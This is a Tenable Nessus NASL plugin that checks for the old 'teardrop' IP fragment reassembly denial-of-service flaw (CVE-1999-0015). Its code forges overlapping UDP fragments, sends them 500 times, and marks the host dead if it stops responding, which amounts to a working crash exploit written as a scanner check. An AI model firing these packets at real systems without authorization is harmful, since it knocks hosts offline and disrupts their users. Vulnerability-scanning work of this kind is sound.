#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10279);
 script_version ("$Revision: 1.26 $");
 script_cve_id("CVE-1999-0015");
 script_bugtraq_id(124);
 script_xref(name:"OSVDB", value:"5727");
 
 script_name(english:"TCP/IP IP Fragment Re-Assembly Remote DoS (teardrop)");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote system is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to make the remote server crash using 
the 'teardrop' attack. 

An attacker may use this flaw to shut down this server, 
thus preventing your network from working properly." );
 script_set_attribute(attribute:"solution", value:
"contact your operating system vendor for a patch." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C" );

script_end_attributes();

 
 script_summary(english:"Crashes the remote host using the 'teardrop' attack");
 script_category(ACT_KILL_HOST);
 script_require_keys("Settings/ParanoidReport"); 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");
 
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");

if (report_paranoia < 2) exit(0);
if ( TARGET_IS_IPV6 ) exit(0);


# Our constants
MAGIC = 2;
IPH   = 20;
UDPH  = 8;
PADDING = 0x1c;
MAGIC = 0x3;
IP_ID = 242;
sport = 123;
dport = 137;

LEN = IPH + UDPH + PADDING;

src = this_host();
ip = forge_ip_packet(ip_v : 4,
		     ip_hl : 5,
		     ip_tos : 0,
		     ip_id  : IP_ID,
		     ip_len : LEN,
		     ip_off : IP_MF,
		     ip_p   : IPPROTO_UDP,
		     ip_src : src,
		     ip_ttl : 0x40);

# Forge the first UDP packet

LEN = UDPH + PADDING;	    
udp1 = forge_udp_packet(ip : ip,
			uh_sport : sport, uh_dport : dport,
			uh_ulen : LEN);		     

# Change some tweaks in the IP packet

LEN = IPH + MAGIC + 1;
ip = set_ip_elements(ip: ip, ip_len : LEN, ip_off : MAGIC);

# and forge the second UDP packet	
LEN = UDPH + PADDING;     
udp2 = 	forge_udp_packet(ip : ip,
			uh_sport : sport, uh_dport : dport,
			uh_ulen : LEN);
			

# Send our UDP packets 500 times

start_denial();
send_packet(udp1,udp2, pcap_active:FALSE) x 500;	
sleep(10);
alive = end_denial();

if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(0);
                }
